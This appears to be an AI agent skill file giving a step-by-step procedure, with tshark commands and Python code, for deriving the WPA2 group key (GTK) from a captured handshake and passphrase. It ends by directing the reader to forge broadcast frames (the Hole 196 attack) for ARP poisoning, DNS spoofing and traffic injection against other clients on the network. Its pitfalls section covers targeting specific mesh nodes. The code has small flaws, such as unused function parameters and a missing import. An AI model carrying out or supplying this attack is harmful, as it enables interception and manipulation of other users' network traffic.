---
name: gtk-derivation-hole196
description: Derive the GTK from a captured WPA2 4-way handshake and known passphrase. Enables Hole 196 broadcast injection attacks.
category: research
---

# GTK Derivation & Hole 196 Attack

Derive the WPA2 Group Temporal Key from a captured 4-way handshake and known PSK. The GTK is shared across all clients on the same AP, enabling broadcast frame forgery (ARP poison, DNS spoof, etc.).

## Prerequisites

- WPA2 handshake capture (.cap/.pcap with M1+M2+M3+M4)
- WPA passphrase
- Python with `pycryptodome` or manual HMAC-SHA1 + AES implementation

## Steps

### 1. Extract handshake parameters

```bash
tshark -r handshake.cap -Y "eapol" -V
```

Get from M1: ANONCE (AP), AP MAC, Client MAC
Get from M2: SNONCE (client)
Get from M3: Key Data field (encrypted GTK)
Note SSID from beacon (or use `aircrack-ng handshake.cap`)

### 2. Derive PMK

```python
pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
```

### 3. Derive PTK via PRF-512

```python
# PRF-512 = HMAC-SHA1 × 4 iterations
def prf512(key, prefix, a, b):
    mac1 = min(ap_mac, client_mac)
    mac2 = max(ap_mac, client_mac)
    n1 = min(anonce, snonce)
    n2 = max(anonce, snonce)
    data = mac1 + mac2 + n1 + n2
    result = b''
    for i in range(4):
        result += hmac.new(key, prefix + b'\x00' + data + bytes([i]), hashlib.sha1).digest()
    return result[:64]

ptk = prf512(pmk, b'Pairwise key expansion', ap_mac, client_mac)
kck = ptk[0:16]   # Key Confirmation Key
kek = ptk[16:32]  # Key Encryption Key
tk  = ptk[32:48]  # Temporal Key
```

### 4. Decrypt GTK from M3 Key Data

```python
# AES Key Unwrap (RFC 3394)
from Crypto.Cipher import AES
def aes_unwrap(kek, ciphertext):
    n = len(ciphertext) // 8 - 1
    A = ciphertext[:8]
    R = [ciphertext[8+i*8:8+(i+1)*8] for i in range(n)]
    aes = AES.new(kek, AES.MODE_ECB)
    for j in range(5, -1, -1):
        for i in range(n, 0, -1):
            B = aes.decrypt(A + R[i-1])
            t = n * j + i
            A = bytes(a ^ b for a, b in zip(B[:8], struct.pack('>Q', t)))
            R[i-1] = B[8:]
    return b''.join(R)

gtk_plain = aes_unwrap(kek, keydata)
gtk_key_id = gtk_plain[0]
gtk = gtk_plain[2:18]  # 16-byte GTK
```

### 5. Hole 196 injection

With the GTK, craft CCMP-encrypted broadcast frames spoofed from the AP BSSID. Any client on the network will accept them as legitimate group traffic. Use for ARP poison, DNS spoof, or traffic injection.

## Pitfalls

- GTK rotates — AP may rekey periodically. Capture a fresh handshake if needed.
- GTK is different per AP node in mesh networks. Derive for the node whose clients you're targeting.
- The SNONCE comes from M2 (client), not M1 (AP). Using ANONCE twice will fail AES unwrap.
- Key Data in M3 is AES-wrapped (RFC 3394), not simply AES-ECB encrypted. Standard AES decrypt will fail.
- If AES unwrap raises ValueError, the KEK is wrong — double-check PTK derivation parameters.

## Reference Files

- `references/fritzbox-worked-example.md` — Real-world FRITZ!Box 7360 key ladder (PSK→PMK→PTK→KCK/KEK), verified with hcxpmktool. 20-digit ISP PSK pattern.
